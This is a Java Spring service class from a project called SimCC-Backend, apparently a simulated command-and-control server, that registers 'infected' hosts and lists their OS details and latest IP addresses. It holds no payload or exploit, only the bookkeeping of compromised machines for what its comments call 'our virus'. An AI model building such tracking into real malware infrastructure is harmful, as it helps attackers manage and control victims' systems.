package at.simcc.simcc_backend.api.service;

import at.simcc.simcc_backend.api.dal.InfectedDal;
import at.simcc.simcc_backend.entities.Infected;
import at.simcc.simcc_backend.entities.TrojanSession;
import at.simcc.simcc_backend.mapper.InfectedMapper;
import at.simcc.simcc_backend.models.InfectedDto;
import at.simcc.simcc_backend.models.InfectedIdDto;
import at.simcc.simcc_backend.models.InfectedNoIdDto;
import at.simcc.simcc_backend.repo.InfectedRepository;
import at.simcc.simcc_backend.repo.TrojanSessionRepository;
import jakarta.persistence.EntityNotFoundException;
import lombok.RequiredArgsConstructor;
import org.jspecify.annotations.Nullable;
import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

/**
 * Project: SimCC-Backend
 * Created by: Georg Kollegger
 * Date: 4/10/26
 */
@Service
@RequiredArgsConstructor
public class InfectedService {
    private final InfectedDal infectedDal;
    private final InfectedRepository infectedRepo;
    private final InfectedMapper mapper;


    public InfectedIdDto registerInfected(String ccid) {
        return infectedDal.registerInfected(ccid);
    }

    /**
     * Returns all infected systems by our virus
     * @currentIpAddress -> the last used ip address
     */
    public List<InfectedDto> getAllInfected() {
        List<Infected> infecteds = infectedRepo.findAll();
        List<InfectedDto> infectedDtos = new ArrayList<>();
        for (Infected infected : infecteds){
            infectedDtos.add(InfectedDto.builder()
                    .iid(infected.getIid())
                    .osInfo(infected.getOsInfo())
                    .osSubType(infected.getOsSubType())
                    .osType(infected.getOsType())
                    .currentIpAddress(infected.getInfectedIPS().getLast().getIp())
                    .build());
        }

        return infectedDtos;
    }
}
